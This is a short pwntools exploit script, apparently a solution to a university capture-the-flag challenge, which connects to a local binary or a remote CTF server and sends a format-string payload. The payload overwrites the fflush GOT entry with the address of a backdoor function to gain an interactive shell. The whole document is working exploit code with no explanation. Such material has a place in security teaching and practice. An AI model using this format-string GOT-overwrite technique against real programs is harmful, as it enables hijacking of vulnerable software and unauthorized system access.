from pwn import *

LOCAL = True

if LOCAL:
    p = process("./program")
else:
    p = remote("ctf-fsi.fe.up.pt", 4007)

what = 0x08049236 # old_backdoor function
where = 0x0804c010 # fflush@GLIBC_2.0
offset = 1

payload = fmtstr_payload(offset, {where: what})
p.recvuntil(b"...")
p.sendline(payload)
p.interactive()
